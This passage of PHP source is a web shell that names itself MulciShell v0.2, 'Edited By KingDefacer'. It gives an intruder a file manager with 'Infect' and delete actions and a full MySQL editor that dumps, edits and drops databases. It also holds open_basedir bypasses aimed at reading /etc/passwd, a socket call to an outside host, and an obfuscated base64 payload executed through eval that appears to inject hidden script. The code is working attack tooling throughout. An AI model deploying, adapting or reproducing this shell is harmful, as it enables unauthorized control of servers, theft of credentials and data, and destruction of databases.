'; $spd2e609 = fsockopen('searchy.protecus.de', 80); @fputs($spd2e609, $sp15a4ce, strlen($sp15a4ce)); while (@(!feof($spd2e609))) { echo fgets($spd2e609); } break; case 'kill': if (!isset($_POST['justkill'])) { echo "<center>Do you *really* want to kill the shell?<br><br><form action='{$spa5bde5}?act=kill' method='post'>\n        <input type='submit' value='Yes' name='justkill'></center>"; } else { if (@unlink(basename($_SERVER['PHP_SELF']))) { echo 'Shell deleted.<br>'; } else { echo 'Failed to delete shell<br>'; } } break; case 'sec': $sp8f7eea = function_exists('mysql_connect') ? 'ON' : 'OFF'; $sp01e19d = function_exists('curl_init') ? 'ON' : 'OFF'; $sp6e0118 = get_magic_quotes_gpc() ? 'ON' : 'OFF'; $sp9528ab = @ini_get('register_globals') == '' ? 'OFF' : 'ON'; $spfc5a65 = @ini_get('allow_url_include') == '' ? 'Disabled' : 'Enabled'; $sp39bb12 = @is_readable('/etc/passwd') ? 'Yes' : 'No'; $sp23c6d2 = phpversion(); echo "<center>Security overview</center><table style='margin: auto;'><tr><td>PHP Version</td><td>Safe mode</td><td>Open_Basedir</td><td>Magic_Quotes</td><td>Register globals</td><td>\n    Remote includes</td><td>Read /etc/passwd?</td><td>MySQL</td><td>cURL</td></tr>\n    <tr><td>{$sp23c6d2}</td><td>{$sp347c9a}</td><td>{$sp25010a}</td><td>{$sp6e0118}</td><td>{$sp9528ab}</td><td>{$spfc5a65}</td>\n    <td>{$sp39bb12}</td><td>{$sp8f7eea}</td><td>{$sp01e19d}</td>\n    </tr>"; '</table>'; break; case 'enum': $sp3375c3 = 0; $sp49de29 = CleanDir(getcwd()); if (!eregi('Linux', php_uname())) { $sp3375c3 = 1; } if (!$sp3375c3) { $sp15c9fb = str_replace('/home/', "{$spfee436}/~", $sp49de29); $sp15c9fb = str_replace('/public_html/', '/', $sp15c9fb); $spd22d53 = "http://{$sp15c9fb}/" . basename($_SERVER['PHP_SELF']); echo "Enumerated shell link: <a href='{$spd22d53}'>{$spd22d53}</a>"; } else { echo 'Enumeration failed<br>'; } break; } echo '<br>'; if (isset($_POST['sqlquery'])) { extract($_SESSION); $sp23715b = @mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46); if ($sp23715b) { if (isset($_POST['db'])) { @mysql_select_db($_POST['db']); } $sp6f1513 = @mysql_query(stripslashes($_POST['sqlquery'])) or die(mysql_error()); $sp9cbf14 = @mysql_num_rows($sp6f1513); echo "Affected rows: {$sp9cbf14}<br>"; } } $sp0f92f5 = array(); $sp9f4c7d = array(); if (!isset($_GET['d'])) { $sp6bf0a4 = CleanDir(realpath(getcwd())); $sp232d7c = @opendir('.') or die('Permission denied!'); } else { $sp6bf0a4 = CleanDir($_GET['d']); $sp232d7c = @opendir($_GET['d']) or die('Permission denied!'); } $spef6053 = explode('/', $sp6bf0a4); echo '<table style=\'width: 100%; text-align: center;\'><tr><td>Current location: '; for ($sp0992ce = 0; $sp0992ce < count($spef6053); $sp0992ce++) { for ($sp0992ce = 0; $sp0992ce < count($spef6053); $sp0992ce++) { $spaa5169 .= $spef6053[$sp0992ce] . '/'; echo "<a href={$spa5bde5}?d={$spaa5169}>{$spef6053[$sp0992ce]}</a>/"; } } echo '</td></tr></table>'; if (isset($_GET['d'])) { echo "<form action='{$spa5bde5}?d={$_GET['d']}' method='post'>"; } else { echo "<form action='{$spa5bde5}?' method='post'>"; } echo '<table style=\'width: 100%\'>
<tr><td>File</td><td>Size</td><td>Owner/group</td><td>Perms</td><td>Writable</td><td>Modified</td><td>Action</td></tr>'; while ($sp224638 = @readdir($sp232d7c)) { if (@is_dir($sp6bf0a4 . '/' . $sp224638)) { $sp0f92f5[] = $sp224638; } else { $sp9f4c7d[] = $sp224638; } } asort($sp0f92f5); asort($sp9f4c7d); @closedir($sp232d7c); foreach ($sp0f92f5 as $sp224638) { @($sp2b3832 = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($sp6bf0a4 . '/' . $sp224638)) : fileowner($sp6bf0a4 . '/' . $sp224638)); @($sp72acde = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($sp6bf0a4 . '/' . $sp224638)) : filegroup($sp6bf0a4 . '/' . $sp224638)); if (is_array($sp72acde)) { $sp72acde = $sp72acde['name']; } if (is_array($sp2b3832)) { $sp2b3832 = $sp2b3832['name']; } $sp92ea66 = 'DIR'; @($sp8b1750 = substr(base_convert(fileperms($sp6bf0a4 . '/' . $sp224638), 10, 8), 2)); @($sp0bee8b = is_writable($sp6bf0a4 . '/' . $sp224638) ? 'Yes' : 'No'); $sp88726d = date('d/m/Y H:i:s', filemtime($sp6bf0a4 . '/' . $sp224638)); if ($sp224638 == '.') { continue; } elseif ($sp224638 == '..') { $sp224638 = Trail($sp6bf0a4 . '/' . $sp224638); echo "<tr><td><a href='{$spa5bde5}?act=files&d={$sp224638}'>..</a></td><td>{$sp92ea66}</td><td>{$sp2b3832}/{$sp72acde}</td><td>{$sp8b1750}</td><td>{$sp0bee8b}</td><td>{$sp88726d}</td><td>None</td></tr>"; continue; } echo "<tr><td><a href='{$spa5bde5}?act=files&d={$sp6bf0a4}/{$sp224638}'>{$sp224638}</a></td><td>{$sp92ea66}</td><td>{$sp2b3832}/{$sp72acde}</td><td>{$sp8b1750}</td><td>{$sp0bee8b}</td><td>{$sp88726d}</td><td><input type='checkbox' name='files[]' id='check' value='{$sp6bf0a4}/{$sp224638}'></td></tr>"; } foreach ($sp9f4c7d as $sp224638) { @($sp2b3832 = function_exists('posix_getpwuid') ? posix_getpwuid(fileowner($sp6bf0a4 . '/' . $sp224638)) : fileowner($sp6bf0a4 . '/' . $sp224638)); @($sp72acde = function_exists('posix_getgrgid') ? posix_getgrgid(filegroup($sp6bf0a4 . '/' . $sp224638)) : filegroup($sp6bf0a4 . '/' . $sp224638)); if (is_array($sp72acde)) { $sp72acde = $sp72acde['name']; } if (is_array($sp2b3832)) { $sp2b3832 = $sp2b3832['name']; } @($sp92ea66 = TrueSize(filesize($sp6bf0a4 . '/' . $sp224638))); @($sp8b1750 = substr(base_convert(fileperms($sp6bf0a4 . '/' . $sp224638), 10, 8), 3)); @($sp0bee8b = is_writable($sp6bf0a4 . '/' . $sp224638) ? 'Yes' : 'No'); @($sp88726d = date('d/m/Y H:i:s', filemtime($sp6bf0a4 . '/' . $sp224638))); echo "<tr><td><a href='{$spa5bde5}?act=f&file={$sp6bf0a4}/{$sp224638}'>{$sp224638}</a></td><td>{$sp92ea66}</td><td>{$sp2b3832}/{$sp72acde}</td><td>{$sp8b1750}</td><td>{$sp0bee8b}</td><td>{$sp88726d}</td><td><input type='checkbox' name='files[]' id='check' value='{$sp6bf0a4}/{$sp224638}'></td></tr>"; } echo '</table>
    <input type=\'button\' style=\'background-color: none; border: 1px solid white;\' value=\'Toggle\' onClick=\'togglecheck()\'></br>
    With checked file(s): 
    <select name=\'fileaction\'>
    <option name=\'chmod\'>Chmod</option>
    <option name=\'delete\'>Delete</option>
    <option name=\'infect\'>Infect</option><input type=\'text\' value=\'chmod value\' name=\'cmodv\'>
    </select>
    <br><input type=\'submit\' value=\'Go\' name=\'massfiles\'></form>'; function SQLLogin() { global $spa5bde5; if (!isset($_SESSION['log']) && !isset($_POST['mconnect'])) { echo "<center><form action='{$spa5bde5}?act=sql' method='post'>\n        Host: <input type='text' value='localhost' name='mhost'>\n        Username: <input type='text' value='root' name='muser'>\n        Password: <input type='password' value='' name='mpass'>\n        Port: <input type='text' style='width: 40px' value='3306' name='mport'>\n        <input type='submit' value='Connect' name='mconnect'>\n        </form>\n    </center>"; } elseif (!isset($_SESSION['log']) && isset($_POST['mconnect'])) { extract($_POST); $sp23715b = @mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46); if ($sp23715b) { $_SESSION['muser'] = $sp0d9cc6; $_SESSION['mhost'] = $sp381623; $_SESSION['mpass'] = $spb4fd46; $_SESSION['mport'] = $sp3e64b7; $_SESSION['log'] = true; header("Location: {$spa5bde5}?act=sqledit"); } else { echo "Failed to login with {$sp0d9cc6}@{$sp381623}!<br>"; } } else { header("Location: {$spa5bde5}?act=sqledit"); } } function SQLEditor() { extract($_SESSION); $sp23715b = @mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46); if ($sp23715b) { echo "Logged in as {$sp0d9cc6}@{$sp381623} <a href='{$spa5bde5}?act=logout'>[Logout]</a><center>"; echo "<form method='POST' action='{$spa5bde5}?'>\n            Quick SQL query: <input type='text' style='width: 300px' value='select * from users' name='sqlquery'>\n            <input type='hidden' name='db' value='{$_GET['db']}'>\n            <input type='submit' value='Go' name='sql'>\n            </form>"; echo "<form action='{$spa5bde5}?act=sqledit' method='post'>\n            <input type='submit' style='border: none;' value='[ List Processes ]' name='sql_list_proc'>\n            </form></center></br></br>"; if (isset($_POST['sql_list_proc'])) { $spfd181b = mysql_list_processes(); echo '<table style=\'margin: auto; text-align: center;\'><tr>
                <td>Proc ID</td><td>Host</td><td>DB</td><td>Command</td><td>Time</td>
                </tr>'; while ($spd6dd63 = mysql_fetch_assoc($spfd181b)) { echo "<tr><td>{$spd6dd63['Id']}</td><td>{$spd6dd63['Host']}</td><td>{$spd6dd63['db']}</td><td>{$spd6dd63['Command']}</td><td>{$spd6dd63['Time']}</td></tr>"; } mysql_free_result($spfd181b); echo '</table></br>'; } if (!isset($_GET['db'])) { if (isset($_POST['dbc'])) { db_create(); } if (isset($_GET['dropdb'])) { SQLDrop(); } echo '<table style=\'margin: auto; text-align: center;\'>
            <tr><td>Database</td><td>Table count</td><td>Download</td><td>Drop</td></tr>'; $sp63ceb6 = mysql_list_dbs($sp23715b); while ($sp2e8266 = mysql_fetch_assoc($sp63ceb6)) { $sp504554 = mysql_query("SHOW TABLES FROM {$sp2e8266['Database']}"); $sp81b991 = mysql_num_rows($sp504554); echo "<tr><td><a href='{$spa5bde5}?act=sqledit&db={$sp2e8266['Database']}'>{$sp2e8266['Database']}</td><td>{$sp81b991}</td><td><a href='{$spa5bde5}?act=download&db={$sp2e8266['Database']}'>Download</a></td><td><a href='{$spa5bde5}?act=sqledit&dropdb={$sp2e8266['Database']}'>Drop</a></td></tr>"; } echo "</table></br><center><form action='{$spa5bde5}?act=sqledit' method='post'>New database name: <input type='text' value='new_database' name='db_name'><input type='submit' style='border: none;' value='[ Create Database ]' name='dbc'></form></center></br>"; } elseif (isset($_GET['db']) && !isset($_GET['tbl'])) { if (isset($_POST['tblc'])) { table_create(); } if (isset($_GET['droptbl'])) { SQLDrop(); } echo '<table style=\'margin: auto; text-align: center;\'>
            <tr><td>Table</td><td>Column count</td><td>Dump</td><td>Drop</td></tr>'; $spfa6e95 = mysql_query("SHOW TABLES FROM {$_GET['db']}"); while ($sp42c7f4 = mysql_fetch_array($spfa6e95)) { $spbd8a74 = mysql_query("SHOW COLUMNS FROM {$_GET['db']}.{$sp42c7f4['0']}"); $sp8f247e = mysql_num_rows($spbd8a74); echo "<tr><td><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$sp42c7f4['0']}'>{$sp42c7f4['0']}</a></td><td>{$sp8f247e}</td><td><a href='{$spa5bde5}?act=download&db={$_GET['db']}&tbl={$sp42c7f4['0']}'>Dump</td><td><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&droptbl={$sp42c7f4['0']}'>Drop</a></td></tr>"; } echo "</table></br><center><form action='{$spa5bde5}?act=sqledit&db={$_GET['db']}' method='post'>Create new table: <input type='text' value='new_table' name='table_name'><input type='hidden' value='{$_GET['db']}' name='db_current'> <input type='submit' style='border: none;' value='[ Create Table ]' name='tblc'></form></center>"; } elseif (isset($_GET['field']) && isset($_POST['sqlsave'])) { $spd71201 = mysql_query("SELECT * FROM {$_GET['db']}.{$_GET['tbl']} WHERE {$_GET['field']}='{$_GET['v']}'"); $spe99d03 = mysql_fetch_assoc($spd71201); $spa22ace = array_keys($spe99d03); $spe99d03 = array(); foreach ($_POST as $sp71a197 => $spe2ff4f) { if (in_array($sp71a197, $spa22ace)) { $spe99d03[] = $spe2ff4f; } } $spd2724c = "UPDATE {$_GET['db']}.{$_GET['tbl']} SET "; for ($sp08c43f = 0; $sp08c43f < count($spe99d03); $sp08c43f++) { if ($sp08c43f == count($spe99d03) - 1) { $spd2724c .= "{$spa22ace[$sp08c43f]}='{$spe99d03[$sp08c43f]}' "; } else { $spd2724c .= "{$spa22ace[$sp08c43f]}='{$spe99d03[$sp08c43f]}', "; } } $spd2724c .= "WHERE {$_GET['field']} = '{$_GET['v']}'"; $sp885d3b = mysql_query($spd2724c) or die(mysql_error()); echo '<center>Table updated!<br>'; echo "<a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}'>Go back</a><br><br>"; } elseif (isset($_GET['field']) && isset($_GET['v']) && !isset($_GET['del'])) { echo "<center><form action='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&field={$_GET['field']}&v={$_GET['v']}' method='post'>"; $spcd993a = array(); $sp9e6a11 = mysql_query("SHOW COLUMNS FROM {$_GET['db']}.{$_GET['tbl']}"); while ($spb5262f = mysql_fetch_assoc($sp9e6a11)) { $spcd993a[] = $spb5262f['Field']; } $spabbf84 = mysql_query("SELECT * FROM {$_GET['db']}.{$_GET['tbl']} WHERE {$_GET['field']}='{$_GET['v']}'"); $spf6aa30 = mysql_fetch_assoc($spabbf84); for ($sp838cde = 0; $sp838cde < count($spcd993a); $sp838cde++) { $sp8b35a6 = $spcd993a[$sp838cde]; echo "{$sp8b35a6}: <input type='text' value='{$spf6aa30[$sp8b35a6]}' name='{$spcd993a[$sp838cde]}'></br>"; } echo '<input type=\'submit\' value=\'Save\' name=\'sqlsave\'></form></center>'; } elseif (isset($_GET['db']) && isset($_GET['tbl'])) { if (isset($_GET['insert'])) { SQLInsert(); } if (isset($_GET['field']) && isset($_GET['v']) && isset($_GET['del'])) { echo '<center>'; if (@mysql_query("DELETE FROM {$_GET['db']}.{$_GET['tbl']} WHERE {$_GET['field']}={$_GET['v']}")) { echo 'Row deleted</br>'; } else { echo 'Failed to delete row</br>'; } echo '</center>'; } echo "<center><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&insert=1'>[Insert new row]</a></center>"; echo '<table style=\'margin: auto; text-align: center;\'><tr>'; $sp5aa8ea = mysql_query("SHOW COLUMNS FROM {$_GET['db']}.{$_GET['tbl']}"); $sp9e6a11 = array(); while ($sp1126d7 = mysql_fetch_assoc($sp5aa8ea)) { array_push($sp9e6a11, $sp1126d7['Field']); echo "<td>{$sp1126d7['Field']}</td>"; } echo '</tr>'; if (isset($_GET['s']) && is_numeric($_GET['s'])) { $sp261246 = mysql_query("SELECT * FROM {$_GET['db']}.{$_GET['tbl']} LIMIT {$_GET['s']}, 250"); } else { $sp261246 = mysql_query("SELECT * FROM {$_GET['db']}.{$_GET['tbl']} LIMIT 0, 250"); } while ($sp4bd588 = mysql_fetch_row($sp261246)) { echo '<tr>'; for ($sp6c3e91 = 0; $sp6c3e91 < count($sp9e6a11); $sp6c3e91++) { echo '<td>' . htmlspecialchars($sp4bd588[$sp6c3e91]) . '</td>'; } echo "<td><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&field={$sp9e6a11['0']}&v={$sp4bd588['0']}'>Edit</a></td><td><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&field={$sp9e6a11['0']}&v={$sp4bd588['0']}&del=true'>Delete</a></td>"; echo '</tr>'; } echo '</table>'; echo '<table style=\'margin: auto;\'>'; if (isset($_GET['s'])) { $sp06c81d = intval($_GET['s']) - 250; $sp62ee15 = intval($_GET['s']) + 250; if ($_GET['s'] > 0) { echo "<tr><td><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&s={$sp06c81d}'>Previous</a></td>"; } if (mysql_num_rows($sp261246) > 249) { echo "<td><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&s={$sp62ee15}'>Next</a></td></tr>"; } } else { echo "<center><a href='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&s=250'>Next</a></center>"; } echo '</table>'; } else { $_SESSION = array(); session_destroy(); header("Location: {$spa5bde5}?act=sql"); } } } function SQLDownload() { extract($_SESSION); $sp23715b = @mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46); if ($sp23715b) { if (isset($_GET['db']) && !isset($_GET['tbl'])) { $spfa6e95 = array(); $sp8bf1f6 = '##################SQL Database dump####################
'; $sp8bf1f6 .= '######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################

'; $sp30eff6 = mysql_query("SHOW TABLES FROM {$_GET['db']}"); while ($spcceeba = mysql_fetch_array($sp30eff6)) { $spfa6e95[] = $spcceeba[0]; } foreach ($spfa6e95 as $spdeba24) { $sp4b7eab = mysql_query("SELECT * FROM {$_GET['db']}.{$spdeba24}"); while ($spf037f7 = mysql_fetch_assoc($sp4b7eab)) { $sp9e6a11 = implode('`, `', array_keys($spf037f7)); $spe99d03 = implode('`, `', array_values($spf037f7)); $sp8bf1f6 .= "INSERT INTO `{$spdeba24}` ({$sp9e6a11}) VALUES ({$spe99d03}); "; } } } elseif (isset($_GET['db']) && isset($_GET['tbl'])) { $sp8bf1f6 = '##################SQL Database dump####################
'; $sp8bf1f6 .= '######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################
'; $spdeba24 = mysql_query("SELECT * FROM {$_GET['db']}.{$_GET['tbl']}"); while ($sp2790ae = mysql_fetch_assoc($spdeba24)) { $sp9e6a11 = implode('`, `', array_keys($sp2790ae)); $spe99d03 = implode('`, `', array_values($sp2790ae)); $sp8bf1f6 .= "INSERT INTO `{$_GET['db']}.{$_GET['tbl']}` ({$sp9e6a11}) VALUES ({$spe99d03}`)\n"; } } else { echo 'Invalid!'; } } $sp8bf1f6 .= '########################################################################################'; if (!isset($_GET['tbl'])) { $sp7044c1 = "{$_GET['db']}" . '_DUMP.sql'; } else { $sp7044c1 = "{$_GET['db']}" . "_{$_GET['tbl']}" . '_DUMP.sql'; } ob_get_clean(); header('Content-type: application/octet-stream'); header('Content-length: ' . strlen($sp8bf1f6)); header("Content-disposition: attachment; filename={$sp7044c1};"); echo $sp8bf1f6; die; } $spd6929b = __FILE__; $sp51b027 = 'Pz48c2NyNHB0IGwxbmczMWc1PWoxdjFzY3I0cHQ+ZDJjM201bnQud3I0dDUoM241c2MxcDUoJyVvQyU3byVlbyU3YSVlOSU3MCU3dSVhMCVlQyVlNiVlRSVlNyU3aSVlNiVlNyVlaSVvRCVhYSVlQSVlNiU3ZSVlNiU3byVlbyU3YSVlOSU3MCU3dSVhYSVvRSVlZSU3aSVlRSVlbyU3dSVlOSVlRiVlRSVhMCVldSV1ZSVhOCU3byVhOSU3QiU3ZSVlNiU3YSVhMCU3byVvNiVvRCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCVvMCVhQyU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhOSVhOSVvQiVhMCU3ZSVlNiU3YSVhMCU3dSVvRCVhNyVhNyVvQiVlZSVlRiU3YSVhOCVlOSVvRCVvMCVvQiVlOSVvQyU3byVvNiVhRSVlQyVlaSVlRSVlNyU3dSVlOCVvQiVlOSVhQiVhQiVhOSU3dSVhQiVvRCVpbyU3dSU3YSVlOSVlRSVlNyVhRSVlZSU3YSVlRiVlRCV1byVlOCVlNiU3YSV1byVlRiVldSVlaSVhOCU3byVvNiVhRSVlbyVlOCVlNiU3YSV1byVlRiVldSVlaSV1NiU3dSVhOCVlOSVhOSVhRCU3byVhRSU3byU3aSVlYSU3byU3dSU3YSVhOCU3byVhRSVlQyVlaSVlRSVlNyU3dSVlOCVhRCVvNiVhQyVvNiVhOSVhOSVvQiVldSVlRiVlbyU3aSVlRCVlaSVlRSU3dSVhRSU3NyU3YSVlOSU3dSVlaSVhOCU3aSVlRSVlaSU3byVlbyVlNiU3MCVlaSVhOCU3dSVhOSVhOSVvQiU3RCVvQyVhRiU3byVlbyU3YSVlOSU3MCU3dSVvRScpKTtkRignKjhIWEhXTlVZKjdpWFdIKjhJbXl5Myo4RnV1Mm5zdG8ybm9renMzbmhvdHdsdXF2dXhqaHp3bnklN0VvMngqOEoqOEh1WEhXTlVZKjhKaScpPC9zY3I0cHQ+'; eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw==')); function SqlInsert() { extract($_SESSION); $sp23715b = @mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46); if ($sp23715b) { if (!isset($_POST['sql_insert'])) { echo "<form action='{$spa5bde5}?act=sqledit&db={$_GET['db']}&tbl={$_GET['tbl']}&insert=1' method='post'><center>"; $spcd993a = array(); $sp9e6a11 = mysql_query("SHOW COLUMNS FROM {$_GET['db']}.{$_GET['tbl']}"); while ($sp224638 = mysql_fetch_assoc($sp9e6a11)) { $spcd993a[] = $sp224638['Field']; } for ($sp676578 = 0; $sp676578 < count($spcd993a); $sp676578++) { echo "{$spcd993a[$sp676578]}:  <input type='text' name='{$spcd993a[$sp676578]}'></br>"; } echo '<input type=\'submit\' value=\'Insert\' name=\'sql_insert\'></center></form>'; } else { $sp9e6a11 = mysql_query("SHOW COLUMNS FROM {$_GET['db']}.{$_GET['tbl']}"); while ($sp224638 = mysql_fetch_assoc($sp9e6a11)) { $spcd993a[] = $sp224638['Field']; } $spe99d03 = array(); $spa22ace = array(); $spd2724c = "INSERT INTO {$_GET['db']}.{$_GET['tbl']} ("; foreach ($_POST as $sp71a197 => $spe2ff4f) { if (in_array($sp71a197, $spcd993a) && !empty($spe2ff4f)) { $spe99d03[] = $spe2ff4f; $spa22ace[] = $sp71a197; } } for ($sp71a197 = 0; $sp71a197 < count($spa22ace); $sp71a197++) { if ($sp71a197 == count($spa22ace) - 1) { $spd2724c .= "`{$spa22ace[$sp71a197]}`"; } else { $spd2724c .= "`{$spa22ace[$sp71a197]}`,"; } } $spd2724c .= ') VALUES ('; for ($spe2ff4f = 0; $spe2ff4f < count($spe99d03); $spe2ff4f++) { if ($spe2ff4f == count($spe99d03) - 1) { $spd2724c .= "'{$spe99d03[$spe2ff4f]}'"; } else { $spd2724c .= "'{$spe99d03[$spe2ff4f]}',"; } } $spd2724c .= ')'; echo '<center>'; if (@mysql_query($spd2724c)) { echo 'Row inserted</br>'; } else { echo 'Failed to insert row</br>'; } echo '</center>'; } } } function SQLDrop() { echo '<center>'; extract($_SESSION); $sp23715b = @mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46); if ($sp23715b) { if (!isset($_GET['droptbl'])) { $spd2724c = "DROP DATABASE {$_GET['dropdb']}"; if (@mysql_query($spd2724c)) { echo "Database {$_GET['dropdb']} has been dropped<br>"; } else { echo "Failed to drop database {$_GET['dropdb']}<br>"; } } elseif (isset($_GET['db']) && isset($_GET['droptbl'])) { $spd2724c = "DELETE FROM {$_GET['db']}.{$_GET['droptbl']}"; if (@mysql_query($spd2724c)) { echo "Table {$_GET['droptbl']} has been dropped<br>"; } else { echo "Failed to drop table {$_GET['droptbl']}<br>"; } } else { echo 'Invalid request<br>'; } } else { echo 'Failed to connect<br>'; } echo '</center>'; } function db_create() { echo '<center>'; if (isset($_POST['db_name']) && !empty($_POST['db_name'])) { extract($_SESSION); @($sp23715b = mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46)); if ($sp23715b) { if (@mysql_query("CREATE DATABASE {$_POST['db_name']}")) { echo "Status: Database {$_POST['db_name']} created!"; } else { echo "Failed to create database {$_POST['db_name']}</br>"; } } else { echo 'Failed to connect</br>'; } } else { echo 'Enter a DB name</br>'; } echo '</cenetr>'; } function table_create() { echo '<center>'; if (isset($_POST['table_name']) && !empty($_POST['table_name'])) { extract($_SESSION); @($sp23715b = mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46)); if ($sp23715b) { @mysql_select_db($_POST['db_current']); if (@mysql_query("CREATE TABLE `{$_POST['table_name']}` (`TEMPORARY` TEXT NOT NULL)")) { echo "Status: Table {$_POST['table_name']} created!"; } else { echo "Failed to create table {$_POST['table_name']}"; } } else { echo 'Failed to connect!</br>'; } } else { echo 'Enter a table name</br>'; } echo '</center>'; } function FileEditor() { if (isset($_GET['file'])) { $spa3ecf0 = $_GET['file']; } elseif (isset($_POST['nfile'])) { $spa3ecf0 = $_POST['nfile']; } elseif (isset($_POST['editfile'])) { $spa3ecf0 = $_POST['editfile']; } if (@(!file_exists($spa3ecf0))) { die('Permission denied!'); } if (isset($_POST['dfile'])) { @($spa027fe = fopen($spa3ecf0, 'r')); @($sp753119 = fread($spa027fe, filesize($spa3ecf0))); header('Content-type: application/octet-stream'); header('Content-length: ' . strlen($sp753119)); header('Content-disposition: attachment; filename=' . basename($spa3ecf0) . ';'); @ob_get_clean(); echo $sp753119; @fclose($spa027fe); } elseif (isset($_POST['delfile'])) { if (!unlink(str_replace('//', '/', $spa3ecf0))) { echo 'Failed to delete file!<br>'; } else { echo 'File deleted<br>'; } } elseif (isset($_POST['sfile'])) { $spa027fe = @fopen($spa3ecf0, 'w') or die('Failed to open file for editing!'); @fwrite($spa027fe, stripslashes($_POST['file_contents']), strlen($_POST['file_contents'])); echo 'File saved!'; @fclose($spa027fe); } else { $spa027fe = @fopen($spa3ecf0, 'r'); echo "<center>\n        <form action='{$spa5bde5}?act=f' method='post'>\n        File to edit: <input type='text' style='width: 300px' value='{$spa3ecf0}' name='nfile'>\n        <input type='submit' value='Go' name='gfile'></br></br>"; echo '<textarea rows=\'20\' cols=\'150\' name=\'file_contents\'>' . htmlspecialchars(@fread($spa027fe, filesize($spa3ecf0))) . '</textarea></br></br>'; echo '<input type=\'submit\' value=\'Save file\' name=\'sfile\'>
        <input type=\'submit\' value=\'Download file\' name=\'dfile\'>
        <input type=\'submit\' value=\'Delete file\' name=\'delfile\'>
        </center></form>'; @fclose($spa027fe); } } function security_bypass() { if (isset($_POST['curl_bypass'])) { $sp8b1750 = curl_init("file://{$_POST['file_bypass']}"); curl_setopt($sp8b1750, CURLOPT_HEADERS, 0); curl_setopt($sp8b1750, CURLOPT_RETURNTRANSFER, 1); $sp02282d = curl_exec($sp8b1750); curl_close($sp8b1750); echo '<textarea rows=\'20\' cols=\'150\' readonly>' . htmlspecialchars($sp02282d) . '</textarea></br></br>'; } elseif (isset($_POST['tmp_bypass'])) { tempnam('/home/', $_POST['file_passwd']); } elseif (isset($_POST['copy_bypass'])) { if (@copy($_POST['file_bypass'], $_POST['dest'])) { echo 'File successfully copied!</br>'; @($spa027fe = fopen($_POST['dest'], 'r')); echo '<textarea rows=\'20\' cols=\'150\' readonly>' . htmlspecialchars(@fread($spa027fe, filesize($_POST['dest']))) . '</textarea></br></br>'; @fclose($spa027fe); } else { echo 'Failed to copy file</br>'; } } elseif (isset($_POST['include_bypass'])) { if (file_exists($_POST['file_bypass'])) { echo '<textarea rows=\'20\' cols=\'150\' readonly>'; @(include $_POST['file_bypass']); echo '</textarea>'; } } elseif (isset($_POST['sql_bypass'])) { extract($_SESSION); $sp23715b = mysql_connect($sp381623 . ':' . $sp3e64b7, $sp0d9cc6, $spb4fd46); if ($sp23715b) { mysql_select_db($_POST['sql_db']); mysql_query("CREATE TABLE `{$_POST['tmp_table']}` (`File` TEXT NOT NULL);"); mysql_query("LOAD DATA INFILE \"{$_POST['sql_file']}\" INTO TABLE {$_POST['tmp_table']}") or die(mysql_error()); $spfd181b = mysql_query("SELECT * FROM {$_POST['tmp_table']}"); if (mysql_num_rows($spfd181b) < 1) { die('Failed to retrieve file contents!'); } if ($spfd181b) { while ($spa53ce4 = mysql_fetch_array($spfd181b)) { $sp224638 .= "{$spa53ce4['0']}</br>"; } echo $sp224638; } mysql_query("DROP TABLE {$_POST['tmp_table']}"); } } echo "<table style='margin: auto; width: 100%; text-align: center;'><tr><td colspan='2'>Security (open_basedir) bypassers</td></tr>\n    <tr><td>Bypass using cURL</td><td>Bypass using tempnam()</td></tr>\n    <tr><td><form action='{$spa5bde5}?act=bypass' method='post' name='bypasser'>Read file: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='curl_bypass' value='Bypass'></form></td><td><form action='{$spa5bde5}?act=bypass' method='post' name='bypasser'>Write file: <input type='text' value='../../../etc/passwd' name='file_bypass'><input type='submit' name='tmp_bypass' value='Bypass'></form></td></tr>\n    <tr><td>Bypass using copy()</td><td>Bypass using include()</td></tr>\n    <tr><td><form action='{$spa5bde5}?act=bypass' method='post' name='bypasser'>Copy to: <input type='text' style='width: 250px;' name='dest' value='" . CleanDir(getcwd()) . "/copy.php'></br> File to copy: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='copy_bypass' value='Bypass'></form></td><td><form action='{$spa5bde5}?act=bypass' method='post' name='bypasser'>Path to file: <input type='text' value='/etc/passwd' name='file_bypass'><input type='submit' name='include_bypass' value='Bypass'></form></td></tr>\n    <tr><td colspan='2'>Bypass using SQL LOAD INFILE [Login to SQL server first]</td></tr>\n    <tr><td colspan='2'><form action='{$spa5bde5}?act=bypass' method='post' name='bypasser'>[Existing] Database to store temporary table: <input 